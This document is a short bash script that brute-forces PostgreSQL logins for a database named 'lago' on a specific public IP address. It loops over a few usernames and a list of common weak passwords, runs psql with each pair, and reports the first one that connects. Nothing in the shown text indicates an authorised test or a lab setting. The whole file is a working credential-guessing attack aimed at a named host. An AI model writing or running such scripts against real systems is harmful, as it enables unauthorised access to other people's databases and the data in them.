#!/bin/bash
# Try PostgreSQL passwords for Lago on 38.107.234.149
HOST="38.107.234.149"
DB="lago"

for USER in lago postgres bult; do
  for PASS in lago Lago lago123 LAGO changeme change_me password postgres admin secret bult BULT p@ssw0rd "" lago_dev lago_prod lago_lago test Test 123456 qwerty; do
    result=$(PGPASSWORD="$PASS" psql -h "$HOST" -U "$USER" -d "$DB" -c "SELECT 1" -t 2>&1)
    if echo "$result" | grep -q "1 row"; then
      echo ">>> FOUND: $USER : $PASS"
      exit 0
    fi
  done
done
echo "No password found"
exit 1
